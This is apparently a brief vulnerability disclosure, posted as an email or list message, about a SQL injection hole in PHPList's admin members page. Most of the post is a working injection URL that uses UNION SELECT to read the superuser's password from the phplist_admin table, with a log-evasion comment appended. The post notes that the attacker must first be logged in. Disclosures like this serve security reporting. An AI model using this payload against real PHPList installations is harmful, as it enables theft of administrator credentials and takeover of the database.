Subject: PHPList Vunerability


http://example.com/lists/admin/?page=members&id=1%20union%20select%20null,password,null,null%20from%20phplist_admin%20where%20superuser=1/*sp_password

Although not completely open because one must authenticate, but completely leaves the database open.. thus being a SQL Injection hole.
